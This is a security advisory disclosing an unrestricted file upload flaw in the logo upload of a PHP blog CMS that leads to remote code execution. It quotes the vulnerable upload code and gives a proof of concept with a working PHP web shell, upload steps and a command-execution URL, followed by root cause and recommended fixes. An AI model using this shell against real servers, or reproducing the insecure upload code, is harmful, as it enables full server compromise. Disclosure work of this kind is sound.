# CVE-2025-15495 - Arbitrary File Upload Leading to Remote Code Execution (RCE)

## Product

**BiggiDroid – Simple PHP Blog CMS**
 Product page: https://biggidroid.com/product/simple-php-blog/

## Vulnerability Type

- Arbitrary File Upload
- Unrestricted File Upload
- Remote Code Execution (RCE)

## Severity

**Critical**

**CVSS (Estimated):** 9.8 (AV:N / AC:L / PR:L / UI:N / S:U / C:H / I:H / A:H)

------

##  Summary

The *Simple PHP Blog CMS* contains an **unrestricted file upload vulnerability** in the admin panel’s **Site Logo upload functionality**.
 An authenticated attacker can upload a **malicious PHP file** disguised as an image, which is stored in a **web-accessible directory** and executed by the server, resulting in **remote command execution**.

------

##  Affected Component

**Admin Panel → Update Site Logo**

Relevant vulnerable code snippet:

```
$target = "../image/".basename($_FILES['image']['name']);
$image = $_FILES['image']['name'];

$query = mysqli_query($con,
"UPDATE sitedetails SET sitelogo='$image' WHERE id='$id'");

if (move_uploaded_file($_FILES['image']['tmp_name'], $target)) {
    // success
}
```

###  Issues

- No file extension validation
- No MIME type validation
- No server-side file content checks

------

##  Proof of Concept (PoC)

###  Create a Malicious PHP File

Create a file named `shell.php`:

```
<?php
$cmd = $_GET['cmd'] ?? '';
echo "<pre>";
system($cmd);
echo "</pre>";
?>
```

------

### Upload the File via Admin Panel

- Login to admin panel
- Navigate to **Site Logo → Update Logo**
- Upload `shell.php` as the logo file
- Submit the form

📌 The application **accepts the PHP file without validation**

------

###  Access the Uploaded Web Shell

After upload, the file is accessible at:

```
http://127.0.0.1/image/shell.php
```

Execute system commands:

```
http://127.0.0.1/image/shell.php?cmd=dir
```

------

### Successful Command Execution

The server executes OS commands and returns output, confirming **Remote Code Execution**.

------
# Proof of Concept
1. Product Page
![ProductPage](/images/product_page.JPG)
2. Upload Shell from this location.
![shell](/images/cms.PNG)
3. Shell PHP
![ProductPage](/images/shell_php.PNG)
4. Remote Code Execution
![rce](/images/cmd_execute.PNG)
5. Vulnerable Code
![code](/images/code.PNG)

##  Impact

An attacker can:

- Execute arbitrary OS commands
- Read sensitive configuration files
- Modify or delete application data
- Upload persistent backdoors
- Fully compromise the hosting server

This vulnerability can lead to **complete server takeover**.

------

## Root Cause Analysis

- Missing file extension whitelist
- No MIME type enforcement
- Direct use of user-supplied filename
- Upload directory allows PHP execution
- No `.htaccess` / server hardening

------

## ✅ Recommended Fixes

1. **Restrict file extensions**

   ```
   $allowed = ['jpg','jpeg','png','gif'];
   ```

2. **Validate MIME type**

   ```
   finfo_file()
   ```

3. **Rename uploaded files**

   - Use random UUIDs
   - Never trust user filenames

------

## 📚 References

- OWASP Unrestricted File Upload
- CWE-434: Unrestricted Upload of File with Dangerous Type
- OWASP Top 10 – A03: Injection

------

## 🧑‍💻 Discovered By

* **Mo Asim** also known as **Asim Qazi**
* Github: @Asim-Qazi
* Linkedin: [Asim Qazi](https://www.linkedin.com/in/masimqazi)
* Student | Security Researcher
